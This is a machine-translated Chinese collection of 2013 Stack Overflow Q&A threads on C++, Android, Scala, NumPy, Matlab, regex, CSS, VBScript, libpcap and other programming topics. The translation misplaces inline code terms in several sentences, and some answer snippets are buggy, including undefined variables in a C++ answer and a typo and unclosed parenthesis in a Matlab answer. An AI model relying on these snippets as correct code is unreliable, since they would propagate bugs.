          quotePart = input.substr(firstQuote+1, secondQuote-firstQuote-1);
                                   //drop those quotes
       }

       std::for_each(firstPart.begin(), firstPart.end(), convert());
       firstPart.erase(remove_if(firstPart.begin(), 
                firstPart.end(), isSpace),firstPart.end());
       std::for_each(secondPart.begin(), secondPart.end(), convert());
       secondPart.erase(remove_if(secondPart.begin(), 
                    secondPart.end(), isSpace),secondPart.end());
       input = firstPart + quotePart + secondPart;
    }
    else //does not contains quote
    {
        std::for_each(input.begin(), input.end(), convert());
        input.erase(remove_if(input.begin(), 
                          input.end(), isSpace),input.end());
    }
     cout << "transformed string: " << input << endl;
     return 0;
} 
```

它给出了以下输出：

```
original string: The day is "Mon Day" You know
transformed string: THEDAYISMon DayYOUKNOW 
```

使用您展示的测试用例：

```
original string: The day is "Mon Day"
transformed string: THEDAYISMon Day 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:59:25.263

您可以使用and`stringstream`字符作为分隔符而不是换行符。将您的字符串分成 3 种情况：第一个引号之前的字符串部分、引号中的部分和第二个引号之后的部分。`getline``\"`

您将在添加到输出之前处理第一部分和第三部分，但添加第二部分而不进行处理。

如果您的字符串不包含引号，则整个字符串将包含在第一部分中。第二和第三部分将是空的。

```
while (getline (is, str)) {

  string processed;
  stringstream line(str);
  string beforeFirstQuote;
  string inQuotes;

  getline(line, beforeFirstQuote, '\"');
  Process(beforeFirstQuote, processed);

  getline(line, inQuotes, '\"');
  processed += inQuotes;

  getline(line, afterSecondQuote, '\"');
  Process(afterFirstQuote, processed);

}

void Process(const string& input, string& output) {
    for (string::const_iterator it = input.begin(), end_it = input.end(); it != end_it; ++it)
    {
      char c = *it;

        if (! ::isspace(c))
          {
            output.push_back(::toupper(c));
          }

    }
} 
```

# android - 创建一个从时间戳开始计数的计时器

> ID：15973811
> 
> 赞同：0
> 
> 时间：2013-04-12T14:21:07.933
> 
> 标签：android, timer, chronometer

我要做的是创建一个计时器，它从给定的时间戳开始计数，基本上告诉我自该时间点以来已经过了多长时间。

一个示例时间戳是这样的`1365679237087`

我在看，`Chronometer`但如果我将基数设置为时间戳，它会给我所有这些 ascii 字符，而不是从时间开始计数。

例子：

```
timer = (Chronometer)v.findViewById(R.id.chronometer1);
timer.setBase(1365679237087);
timer.start(); 
```

这不是如何使用计时器吗？

是否有另一种解决方案来获得我想做的事情

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:37:58.527

我认为 Arju 的建议是最简单的。

只需在开始时花时间，在结束时获得差异。将此添加到您的时间戳中，您应该会很好。

```
long start = System.currentTimeMillis();

long difference = System.currentTimeMillis() - start;

long newStamp = 1365679237087 + difference; 
```

我认为您可能会遇到问题，因为您的时间戳使用毫秒 - Chronometer.setBase() 是否支持毫秒时间戳？

编辑：查看[Chronometer 源](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.2.2_r1/android/widget/Chronometer.java#Chronometer.updateText%28long%29)，我看不到毫秒，只有秒。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T16:34:46.953

我想通了，我需要获取时间之间的差异，将其添加到系统时间并找到我的时区的偏移量，因为时间是 UTC

```
long system = SystemClock.elapsedRealtime();
long t = incidentStartTime-System.currentTimeMillis();

timer.setBase((system+t)+14400000);
timer.start(); 
```

# scala - 使用 Scala 2.10 `to` 将 List 转换为 SortedMap

> ID：15973819
> 
> 赞同：5
> 
> 时间：2013-04-12T14:21:24.997
> 
> 标签：scala, collections, type-conversion

我正在尝试使用 Scala 2.10 中的新方法将 a `scala.collection.immutable.List`of pair 转换为 a ，但出现编译时错误：`scala.collection.immutable.SortedMap``to`

```
scala> List((1, "Fred"), (2, "Barney")).to[scala.collection.immutable.SortedMap]
<console>:10: error: scala.collection.immutable.SortedMap takes two type parameters, expected: one
              List((1, "Fred"), (2, "Barney")).to[SortedMap]
                                                  ^ 
```

这可以使用该`to`方法完成吗？我错过了中间方法调用吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-12T14:26:34.847

前段时间我有一个[类似的问题并想出了这个：](https://stackoverflow.com/questions/15042421/create-sortedmap-from-iterator-in-scala)

```
SortedMap( list: _*) 
```

所以你可以这样做：

```
val map =  SortedMap( List((1, "Fred"), (2, "Barney")): _*) 
```

这`_*`意味着您将`Seq`s 元素而不是`Seq`自身作为参数。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-12T15:48:45.150

@gourlaysama 已经解释了为什么它不能编译，@Chirlo 提供了最简单（和推荐）的解决方法：`SortedMap( list: _*)`.

我想提出一个替代方案：

```
import collection.Traversable
import collection.generic.CanBuildFrom
implicit class RichPairTraversable[A,B]( t: Traversable[(A,B)] ) {
  def toPairCol[Col[A,B]](implicit cbf: CanBuildFrom[Nothing, (A,B), Col[A, B]]): Col[A, B] = {
    val b = cbf()
    b.sizeHint(t)
    b ++= t
    b.result
  }  
} 
```

REPL 中的一些测试：

```
scala> List((1, "Fred"), (2, "Barney")).toPairCol[scala.collection.immutable.SortedMap]
res0: scala.collection.immutable.SortedMap[Int,String] = Map(1 -> Fred, 2 -> Barney)

scala> List((1, "Fred"), (2, "Barney")).toPairCol[scala.collection.immutable.HashMap]
res1: scala.collection.immutable.HashMap[Int,String] = Map(1 -> Fred, 2 -> Barney) 
```

现在，我可能不会在生产中使用它，因为这样做`SortedMap( list: _* )`并不难，也不需要魔法。

# python - Qpid 可靠性

> ID：15973821
> 
> 赞同：0
> 
> 时间：2013-04-12T14:21:29.123
> 
> 标签：python, qpid

我正在使用带有用 C++、Python 和 Java 编写的客户端的 C++ 代理。如果我们在一夜之间运行系统，它不会在早上发送/接收消息。所有消息都在主题上交换，主题指定目的地。我有3个问题：

1.) 我们应该使用队列吗？使用队列而不是主题有优势吗？在主题上选择队列的设计决策是什么？队列似乎更加僵化（即，如果您知道节点 A 发送了一个请求并想要一个响应，那么您将立即发送一个响应；发布/订阅）。

2.) 如果消息未被确认，会发生什么？我发现 Python 模块缺少 session.acknowledge()。这会导致我们一夜之间的失败吗？我今天发现了这个问题，所以我希望明天有更多的见解。补救措施是重新启动 qpidd 服务。（我们在 x64 Linux 上运行）。

3.) 这是使用集群故障转移的好理由吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T12:50:27.203

1）这取决于架构。队列和主题这两种方法都可以将消息从多个来源获取到多个目的地。主题将消息发送给所有侦听器，队列将消息发送给其中一个侦听器 - 谁先获取消息。

2) 是否有任何与失败有关的错误或日志消息？我怀疑你的资源用完了。

3) 不，您应该在 24 小时之前弄清楚您的消息传递失败的原因。

# python - 处理 NumPy 分配中的重复索引

> ID：15973827
> 
> 赞同：26
> 
> 时间：2013-04-12T14:21:45.623
> 
> 标签：python, numpy

我在二维数组中设置多个元素的值，但是我的数据有时包含给定索引的多个值。

似乎总是分配“稍后”的值（参见下面的示例），但是这种行为是否得到保证，或者我是否有可能得到不一致的结果？我怎么知道我可以在矢量化分配中以我想要的方式解释“稍后”？

即在我的第一个示例中`a`肯定会始终包含`4`并且在第二个示例中它会打印`values[0]`吗？

非常简单的例子：

```
import numpy as np
indices = np.zeros(5,dtype=np.int)
a[indices] = np.arange(5)
a # array([4]) 
```

另一个例子

```
import numpy as np

grid = np.zeros((1000, 800))

# generate indices and values
xs = np.random.randint(0, grid.shape[0], 100)
ys = np.random.randint(0, grid.shape[1], 100)
values = np.random.rand(100)

# make sure we have a duplicate index
print values[0], values[5]
xs[0] = xs[5]
ys[0] = ys[5]

grid[xs, ys] = values

print "output value is", grid[xs[0], ys[0]]
# always prints value of values[5] 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-15T23:07:43.137

在 NumPy 1.9 及更高版本中，这通常不会被很好地定义。

当前的实现使用单独的迭代器同时迭代所有（广播的）花式索引（和赋值数组），并且这些迭代器都使用 C 顺序。换句话说，目前，是的，你可以。因为您可能想更准确地了解它。如果你`mapping.c`在处理这些事情的 NumPy 中进行比较，你会看到它使用`PyArray_ITER_NEXT`，它被[记录](http://docs.scipy.org/doc/numpy/user/c-info.beyond-basics.html)为 C 顺序。

对于未来，我会以不同的方式描绘这幅画。我认为使用较新的迭代器一起迭代所有索引+赋值数组会很好。如果这样做了，那么订单可以保持开放，以便迭代器决定最快的方式。如果你保持它对迭代器开放，很难说会发生什么，但你不能确定你的例子是否有效（可能一维情况你仍然可以，但是......）。

所以，据我所知，它目前有效，但它是无证的（据我所知），所以如果你真的认为应该确保这一点，你需要游说它并最好编写一些测试以确保它可以得到保证。因为至少我很想说：如果它让事情变得更快，就没有理由确保 C-order，但当然也许有一个很好的理由隐藏在某个地方......

这里真正的问题是：你为什么要那样做？;)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-05-06T17:51:02.010

我知道这已得到令人满意的回答，但我想提一下，它被记录为“[使用索引数组索引](http://www.scipy.org/Tentative_NumPy_Tutorial#head-0dffc419afa7d77d51062d40d2d84143db8216c2)”下的[Tentative Numpy 教程中的“](http://www.scipy.org/Tentative_NumPy_Tutorial)*最后一个值*”（可能是非正式的）：

> 但是，当索引列表包含重复时，分配会进行多次，留下最后一个值：
> 
> ```
> >>> a = arange(5)
> >>> a[[0,0,2]]=[1,2,3]  
> >>> a
> array([2, 1, 3, 3, 4]) 
> ```
> 
> 这是足够合理的，但要注意是否要使用 Python 的 += 构造，因为它可能无法达到您的预期：
> 
> ```
> >>> a = arange(5) 
> >>> a[[0,0,2]]+=1  
> >>> a
> array([1, 1, 3, 3, 4]) 
> ```
> 
> 即使 0 在索引列表中出现两次，第 0 个元素也只会增加一次。这是因为 Python 要求`a+=1`等同于`a=a+1`.

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-04-16T09:35:21.590

我不是直接回答你的问题，我只是想指出，**即使你可以**依赖这种行为是一致的，你最好不要。

考虑：

```
a = np.zeros(4)
x = np.arange(4)
indices = np.zeros(4,dtype=np.int)
a[indices] += x 
```

在这一点上，假设' 之前的 sum +`a.sum()`是否合理？`a``x.sum()`

```
assert a.sum() == x.sum()
--> AssertionError 

a
= array([ 3.,  0.,  0.,  0.]) 
```

在您的情况下，当使用重复索引分配给数组时，结果很直观：对同一索引的分配发生多次，因此只有最后一个分配“坚持”（它会覆盖以前的分配）。

但在本例中并非如此。它不再是直观的。如果是这样，就地添加将发生多次，因为添加本质上是累积的。

所以，换一种说法，你有陷入这个陷阱的风险：

*   你开始使用重复的索引
*   你看一切都很好，行为正是你所期望的
*   您不再关注您的操作涉及重复索引的关键事实。毕竟，这没什么区别，不是吗？
*   您开始在不同的上下文中使用相同的索引，例如如上所述
*   深深的遗憾：）

所以，引用@seberg：

> 这里真正的问题是：你为什么要那样做？;)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2015-01-14T23:50:39.313

我找到了一种使用 numpy 执行此操作的方法，这显然不是最佳的，但它比循环更快（使用 python for 循环）

与：numpy.bincount

```
size = 5
a = np.arange(size)
index = [0,0,2]
values = [1,2,3]
a[index] += values
a
[2 1 5 3 4] 
```

女巫不正确，但是：

```
size = 5
a = np.arange(size)
index = [0,0,2]
values = [1,2,3]
result = np.bincount(index, values, size)
a += result
a
[3 1 5 3 4] 
```

这很好！

# matlab - Matlab在不同的时间间隔不同的功能

> ID：15973839
> 
> 赞同：1
> 
> 时间：2013-04-12T14:22:15.787
> 
> 标签：matlab, function, if-statement

如果 temp 小于 0.5，我希望函数 y 为零，否则为 exp(x)。但是我在下面尝试的只是将所有 y 设置为零。有什么建议么？

```
x = 0:.01:2;
tmp = x.^2;

if tmp<0.5
  y= exp(x);
else
  y= 0;
end
plot(x,y); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:24:09.713

设置`y`为`exp(x)`然后使用逻辑索引设置`y`为零，其中`tmp`小于`0.5`：

```
y = exp(x);
t(tmp < 0.5) = 0; 
```

此外，如果`y`matlab 中不存在，那么您可以像这样一步完成：

```
y(tmp >= 0.5) = exp(x(tmp >= 0.5) 
```

并且零将被自动填充。但我个人更喜欢第一种方式。

# xpages - 如何从 extlib 对话框中删除关闭图标？

> ID：15973841
> 
> 赞同：1
> 
> 时间：2013-04-12T14:22:20.783
> 
> 标签：xpages, xpages-extlib

我正在使用 extlib Dialog 组件来显示一些数据。我希望用户仅通过其中的按钮关闭对话框。

我在标题栏中看不到任何禁用关闭图标的选项。有人可以指出我这样做的文档吗？到目前为止，我已经检查了 wiki + extlib 书（也许我错过了？）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-12T14:50:31.420

CSS规则，再次！据我所知，没有“本机”方法可以摆脱那个关闭按钮（老实说，我认为这样做并不是一个好主意；见下文）。但是使用一些 css 你当然可以在你的页面上隐藏你想要的任何东西。

只需给您的对话框一些自定义样式类；然后在运行时将此自定义类添加到对话框的外部 div 容器中。关闭按钮本身是跨度内的链接；有两个样式类，一个是“lotusClose”。最后将这段代码添加到您的样式表将隐藏按钮：

```
div.yourCustomClass a.lotusClose {display:none;} 
```

警告：“关闭”按钮是故意的。而不是隐藏它，我宁愿在对话框的关闭事件中添加某种验证代码。有很多示例，但也许您只想参考 dojotoolkit.org 的 dijit.Dialog 参考 [（](http://dojotoolkit.org/reference-guide/1.6/dijit/Dialog.html#dijit-dialog) “对话框中的表单和功能”部分）。

顺便说一句：由于对话框基于 dijit.Dialog 您可能还想浏览 stackoverflow 的 dojo 部分。

# node.js - 我无法在 CENTOS 中安装 NODEJS……为什么？

> ID：15973842
> 
> 赞同：2
> 
> 时间：2013-04-12T14:22:21.100
> 
> 标签：node.js, centos5

我得到了一个具有 NODEJS 的 .configure 的版本（node-v0.8.3），因为最新版本没有 .configue o make 或 makeintall ..（刚刚找到了 ./configue 的“操作方法”）...我的服务器是CENTOS 5.. 我想安装 NODEJS.. 需要帮助！我遇到以下错误：

```
xxx@xxx [/usr/local/src/node-v0.8.3]# ./configure
{ 'target_defaults': { 'cflags': [],
                       'default_configuration': 'Release',
                       'defines': [],
                       'include_dirs': [],
                       'libraries': []},
  'variables': { 'host_arch': 'x64',
                 'node_install_npm': 'true',
                 'node_install_waf': 'true',
                 'node_prefix': '',
                 'node_shared_openssl': 'false',
                 'node_shared_v8': 'false',
                 'node_shared_zlib': 'false',
                 'node_use_dtrace': 'false',
                 'node_use_etw': 'false',
                 'node_use_openssl': 'true',
                 'target_arch': 'x64',
                 'v8_no_strict_aliasing': 1,
                 'v8_use_snapshot': 'true'}}
creating  ./config.gypi
Traceback (most recent call last):
  File "./configure", line 400, in <module>
    pprint.pformat(output, indent=2) + "\n")
  File "./configure", line 396, in write
    f = open(filename, 'w+')
IOError: [Errno 13] Permission denied: './config.gypi' 
```

怎么了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T19:44:52.953

我对linux一无所知......但我确实成功使用了这些命令：

```
1: me@server.com [/]# cd ~
2: me@server.com [~]# mkdir node
3: me@server.com [~]# cd node
4: me@server.com [~/node]# wget http://nodejs.org/dist/v0.10.4/node-v0.10.4.tar.gz
5: me@server.com [~/node]# tar zxvf node-v0.10.4.tar.gz
6: me@server.com [~/node]# cd node-v0.10.4
7: me@server.com [~/node/node-v0.10.4]# ./configure
8: me@server.com [~/node/node-v0.10.4]# make
9: me@server.com [~/node/node-v0.10.4]# make install 
```

我在 Centos 5 中遇到权限错误...感谢所有提供帮助的人！

# regex - 数字的正则表达式

> ID：15973845
> 
> 赞同：-1
> 
> 时间：2013-04-12T14:22:29.303
> 
> 标签：regex, numbers

我想为下一个要求构建正确的正则表达式：字符串必须仅包含 10 个数字或 10 个数字逗号 10 个数字（在第二个变体中可以是逗号前后的空格）......而且我不能构建这个 :(
我的变体是这样的，但它是不正确的：

```
([0-9]{10})|([0-9]{10}\s*\,\s*[0-9]{10}) 
```

对不起我的英语=）

UPD：谢谢大家的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:31:28.453

您的模式是正确的，但有一个小缺陷。要记住的规则是：

> 如果您的模式是其他两种模式的 OR ( `|`)，其中一种是另一种的子模式，请将最大的模式放在首位。

因此，通过重新排序您已有的内容，我们将获得：

```
^([0-9]{10}\s*\,\s*[0-9]{10})$|^([0-9]{10})$ 
```

添加`^`并`$`仅包括全行匹配。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:28:04.213

您必须匹配字符串的开头和结尾。

```
/^\d{10}( *, *\d{10})?$/ 
```

试试看：

```
/^\d{10}( *, *\d{10})?$/.test(your_string); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:37:16.243

尝试这个

```
(^\d{10}$|^\d{10} ?, ?\d{10}$) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-12T14:25:46.803

尝试这个：

```
^\d{10}( ?, ?\d{10})?$ 
```

Using`?`使前面的表达式可选

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-12T14:27:08.137

这是您需要的正则表达式：

```
\d{10}( ?, ?\d{10})? 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-12T14:31:17.417

```
^\d{10}(?: ?, ?\d{10})?$ 
```

*   `^...$`= 在字符串的开头和结尾之间
*   `\d{10}`= 10 位数
*   `?`= 可选空间
*   `(?:)`= 非=捕获组

# c++ - 为什么当我将字节数组插入到我的数据库（SQL SERVER，C++）时，它在 0x00 处被拆分

> ID：15973847
> 
> 赞同：1
> 
> 时间：2013-04-12T14:22:31.757
> 
> 标签：c++, sql-server-2008, bytearray, sqlbindparameter, varbinarymax

我必须通过存储过程将一个字节数组插入到 SQLServer2008 中的 VARBINARY(max) 中，并且当我的字节数组元素之一等于 0x00 时，我的字节数组被拆分。

我使用 SQLBindParameter 将我的数据插入数据库，当我的数组中没有任何 0x00 值时它可以正常工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T11:41:30.723

我还可以更改我的插入方法，因此如果有人已经将二进制流 (byte[]) 放入 sql server 的 varbinary 中，它可能真的会对我有所帮助。

# css - 绝对中心在 FF 中不起作用

> ID：15973850
> 
> 赞同：0
> 
> 时间：2013-04-12T14:22:40.860
> 
> 标签：css

我想通过以下方式绝对化 div，但由于某种原因，Firefox 将 div 推到最顶部，因此它水平居中，但垂直居中。铬工作正常

HTML：

```
<body>
<div id="login">
            <div id="header">ict <span class="redText">recruit</span></div>
            <div id="wrapper">

                    <div class="page-header">
                        <h1>Login</h1>
                    </div>
                    <div id="loginBox">
                        <div class="control-group" id="Div1">

                            <div class="controls">
                                <label class="control-label" for="firstName1">Password</label>
                            </div>
                        </div>
                        <div class="control-group" id="firstName1g">
                            <label class="control-label" for="firstName1">Password</label>                
                        </div>
                    </div>
            </div>
</div>
</body> 
```

CSS：

```
#login{
    position: relative;

    text-align:center;
    width: 100%;
    height: 100%;
    display: block;
}
#header {
    position:relative;
    text-align: left;
    padding-left: 50px;
    width: 100%;
    height: 50px;
    border-bottom: 3px solid #dc0000;
    font-family: Leelawadee, sans-serif;
    font-size: 30px;
    line-height: 50px;
}
.redText {
    color: rgb(220,0,0);
}
#wrapper {
    margin: 0 auto;
    position: relative;
    width: 400px;
    height: 400px;
    top: 50%;
    left: 50%;
    margin-top: -200px;
    margin-left: -200px;
    text-align: left;
}
div.page-header h1 {
    font-family: Leelawadee, sans-serif;
    font-weight: 300;
    display: inline-block;
    padding-bottom: 10px;
    border-bottom: 3px solid #dc0000;
}
#loginBox {
    position: relative;
    width: 100%;
    height: 100%;
    padding: 30px;
    background: #e5e5e5;
    -moz-border-radius: 15px;
    -webkit-border-radius: 15px;
    border-radius: 15px;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:34:51.377

摆脱包装纸上的负边距。将位置设置为绝对。调整顶部和左侧的百分比。

[jsfiddle](http://jsfiddle.net/Pkzt3/3/)

***CSS***

```
#wrapper {
   margin: 0 auto;
   position: absolute;
   width: 400px;
   height: 400px;
   top: 50%;
   left: 30%;
   text-align: left; 
```

}

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:35:15.843

作为一般规则，使用负边距是个坏主意……尤其是当它们影响 DOM 中的主要结构元素时。我建议您采用不同的方法来使您的`#wrapper`div 居中，就像我在这个小提琴[http://jsfiddle.net/Uwsxu/2/中所做的那样](http://jsfiddle.net/Uwsxu/2/)

简而言之，去掉你的负边距和你的`left:50%`和`top:50%`

```
#wrapper {
    margin: 0 auto;
    position: relative;
    width: 400px;
    height: 400px;
    text-align: left;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:35:37.903

就像墨菲斯说的：你没有把包装纸上的位置当成绝对的。

如果你想使用这个方法：

```
 margin: 0 auto;
    position: relative;
    width: 400px;
    height: 400px;
    top: 50%;
    left: 50%;
    margin-top: -200px;
    margin-left: -200px; 
```

那么位置应该是绝对的或固定的，而不是相对的。

因此，我建议以下内容使包装器居中：

```
#wrapper {
    margin: 0 auto;
    position: relative;
    width: 400px;
    height: 400px;
    top: 150px; (+ the 50px for the header, since it is relative to the header as well)
    text-align: left;
} 
```

# vbscript - 全局键盘挂钩停止脚本

> ID：15973851
> 
> 赞同：2
> 
> 时间：2013-04-12T14:22:41.403
> 
> 标签：vbscript

我在 VBScript 中创建了一个登录脚本，但我想添加一种在按下某个键时停止的方法。

该脚本当前加载我们的 citrix 桌面并设置了一些映射驱动器，但我想添加一个 if 语句，例如：

```
If keyPressed(F10) not true Then 
```

不幸的是，这超出了我的能力范围。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-13T22:38:52.113

AFAIK VBScript doesn't support asynchronous polling for a key-press. There may be different means to the same end, though.

For one thing, you could make the script a startup script (i.e. a shortcut in a startup folder). That way your users could skip over it by pressing `Shift` at logon (until the desktop icons appear). The downside of this approach is that it doesn't skip selectiveley. Either all startup shortcuts are executed, or none.

Another (perhaps more suitable) way might be the [Popup](http://msdn.microsoft.com/en-us/library/x83z1d9f) method.

```
Set sh = CreateObject("WScript.Shell")

loadCitrix = sh.Popup("Load Citrix Desktop?", 10, , vbYesNo + vbQuestion)

Select Case loadCitrix
  Case -1, vbYes : ...
  Case vbNo      : ...
End Select 
```

This will display a popup message for 10 seconds and then proceed with either the value of the pressed button or the default (`-1` means "no button was pressed").

# ruby-on-rails-3 - Rspec 忽略建立连接语句

> ID：15973855
> 
> 赞同：2
> 
> 时间：2013-04-12T14:22:48.003
> 
> 标签：ruby-on-rails-3, activerecord, rspec

我有一个 Rails 3.2.11 应用程序，其中一些模型设置为使用另一个具有建立连接的数据库。奇怪的是，当运行测试 Rspec 似乎完全忽略了另一个连接时，我不断收到这个错误：

```
ActiveRecord::StatementInvalid: PG::Error: ERROR:  relation "daily_stats" does not exist 
```

我的默认数据库是 Postgres，但另一个是 Mysql。我确定这是因为 Rspec，因为当我通过“rails c test”在测试环境中运行它时，rails 控制台中的东西可以正常工作

任何建议将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-27T14:29:23.050

希望这对某人有所帮助 - 事实证明，我强制所有 ActiveRecord 类在此答案之后使用相同的共享连接：[Why not use shared ActiveRecord connections for Rspec + Selenium?](https://stackoverflow.com/questions/8774227/why-not-use-shared-activerecord-connections-for-rspec-selenium)

确保为每个数据库使用单独的共享连接。

# web-applications - Javascript：我们应该在什么时候（如果有的话）使用库？

> ID：15973856
> 
> 赞同：0
> 
> 时间：2013-04-12T14:22:49.547
> 
> 标签：web-applications, javascript

SO上也有人问过类似的问题，但我找不到这个。如果我错了，我相信 SO 义务警员会纠正我 ;)

我的问题（看似）很简单：**如果有的话，我们应该在什么时候使用 Javascript 库？**

**许多**开发人员提倡只使用纯 Javascript。无论如何，似乎**大多数**开发人员确实使用了一些库。我不是（必须）询问特定的库，但是您在什么时候决定使用库甚至框架？

例如：

如果我想显示倒数计时器，那么包含用于计时器和 DOM 操作的库肯定会很浪费，因为 Javascript 完全能够**简单地**处理这些操作。

但

如果我正在构建一个大型社交媒体平台（想想 Facebook），那么至少包含用于跨浏览器 UI 一致性、DOM 操作、也许 Ajax 等的 JQuery 肯定是明智的......

然后

也许我们可以看看其他一些——MVC 框架、模板库等……

我知道很多人还建议仅将您实际使用的部分从库中拉出。

所以

关于何时（或如何）包含库的任何一般性建议？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:26:00.303

恕我直言，当您花费更多时间来实现移动部件而不是应用程序本身时，是时候开始使用库了

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:27:10.273

一般来说，当你对它感到满意时，你应该使用它。如果您使用 jQuery 或 Mootools，并从例如 Google 托管库 ( [https://developers.google.com/speed/libraries/](https://developers.google.com/speed/libraries/) ) 或其他 CDN 中包含它们，则文件本身几乎总是会被缓存，或从具有 30 天以上到期的高速 CDN。虽然不使用任何库当然可以实现简单的问题，但库的重点是让您作为开发人员的生活变得轻松。如果使用不会使您的网站变慢或对服务器造成压力的库使您的生活变得更轻松，那么一定要让它变得更轻松。

作为建议，我会颠倒这个问题：始终使用库，除非您可以在没有它的情况下同样简单快速地实现所需的全部解决方案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:40:05.693

我认为对此没有明确的答案，如果问题因此而关闭，也不会感到惊讶。无论如何我都会提出我的看法。

你的柜台与社交媒体平台的例子太做作了，以任何方式都不现实。但即使这是一个合理的例子，我会说应用程序的大小或复杂性（感知或其他）与您的决定几乎没有关系。事实上，我认为你正在创造一个你很可能还没有的问题。

与其考虑实现应用程序所需的工具，不如想想你试图用它来实现什么。有人称之为业务逻辑，随便你怎么称呼它，但如果你花时间思考工具而不是如何进入市场，那么你很可能专注于错误的事情。工具以及何时使用它们绝不应该是您的主要关注点。

这是我认为你应该做的。记下两行关于为什么您的应用程序有意义以及为什么它的存在是合理的——不要提及任何工具！把它们烤成幸运饼干，几天后打开。如果您阅读它并且仍然有意义，那么请弄清楚最小功能集是什么——不要提及任何工具！过几天再看一遍，还有道理吗？出色的！现在建立一个原型——不要关心使用什么工具，只要用*任何有效*的方法来证明你的想法。给别人看，有用吗？是的？太棒了，你有一个项目！

无论是您自己的纯 javascript、被库污染，还是完全不同的环境，这都无关紧要。工具并不重要。重要的是您要实现的目标以及如何实现目标。这些工具是外围的、次要的。它们是您到达目的地所需的任何东西。如果这意味着使用提供移动部件的库来让您的应用程序滚动 - 很好！如果这意味着在 javascript 上使用咖啡脚本 - 很好！最后，真正重要的是你想要达到的目标，你用来达到目标​​的工具永远不会是首要关注点。

一边走一边想办法。在你做对之前，你可能会弄错很多次，这就是饼干崩溃的方式。

* * *

您可能还会发现此视频很有用。这是一个关于干净架构的讨论，尽管它主要是对*不*专注于工具如何帮助构建更好的产品的叙述，并且可能是您想要做的。

[https://vimeo.com/43612849](https://vimeo.com/43612849)

# tcp - 使用 libpcap 来实现 tcp listen()

> ID：15973862
> 
> 赞同：0
> 
> 时间：2013-04-12T14:23:05.787
> 
> 标签：tcp, network-programming, libpcap, raw-sockets

我有一项需要修改 tcp 的研究工作，我想实现我的 TCP 监听（）函数版本我的想法是使用 libpcap`TCP SYN`从特定端口捕获所有数据包，然后使用原始套接字创建/发送 SYN/ACK 和跟随 ACK 数据包

我的问题是

1.  传统/常规TCP堆栈listen（）是如何实现的，谁能简要描述一下机制？
2.  我的想法可以实现吗？有什么技巧/障碍吗？
3.  是否有任何其他库/源代码片段可以用来实现我的需要？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:52:41.183

如果您想知道如何`listen()`实现，那么您应该只查看免费操作系统中实现的源代码，但基本上它的工作是在与套接字关联的内核数据结构中设置一个标志，以便将来传入的`SYN`数据包将得到一个响应（并配置在应用程序使用 将它们从队列中排出之前它应该回答`SYN|ACK`多少个这样的 s ）。`SYN``accept()`

您的想法是可以实现的，但需要做很多工作：它相当于在用户空间中实现 TCP 堆栈。如果您只需要为您的研究打开和关闭连接，那么您可以避免执行大部分工作（包括慢启动、窗口缩放以及 TCP 堆栈应该具有​​的所有数据传输功能），但它仍然是一项大工作。

您需要的一件事是防火墙规则，以防止内核响应传入的 TCP 数据包，以便您的代码可以响应它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T23:02:16.153

你不能这样做。Libpcap 没有提供阻止数据包被进一步处理的方法，因此每个数据包仍将由 TCP/IP 堆栈的其余部分处理。因此，SYN 将被确认，对 SYN/ACKS 的 ACK 将创建 TCP 连接，FIN 将终止它们，等等。

# cpanel - 有没有办法将您的 cpanel 域名移动到 heroku？

> ID：15973863
> 
> 赞同：0
> 
> 时间：2013-04-12T14:23:11.620
> 
> 标签：cpanel

我用 cpanel 购买了一个域名和一个托管服务器。我现在要搬到铁轨上，因此是heroku。有没有办法通过cpanel将域名分离到我以前的服务器到heroku？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-26T07:41:49.480

如果您有自定义名称服务器，请将其指向域名注册商端的 heroku IP。

在此之前，请确保正确放置网站内容。从您当前的服务器备份并在 heroku 上恢复。

> 挖掘@heroku_ip domain.com

并确保其正确解析。

这些都是你需要做的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-13T04:10:48.897

是的，首先您可以在 cpanel 中编辑 DNS 信息，以将您的域指向您在 heroku 托管的新站点。[http://docs.cpanel.net/twiki/bin/view/AllDocumentation/CpanelDocs/SimpleDnsEditor](http://docs.cpanel.net/twiki/bin/view/AllDocumentation/CpanelDocs/SimpleDnsEditor)

下一步，您可以将域注册转移到 heroku 并取消旧帐户。

# javascript - 如果内容加载时间超过 7 秒，则在 window.load 中执行代码

> ID：15973865
> 
> 赞同：1
> 
> 时间：2013-04-12T14:23:17.050
> 
> 标签：javascript, jquery

正如标题中所说，我有一个 window.load 行：

```
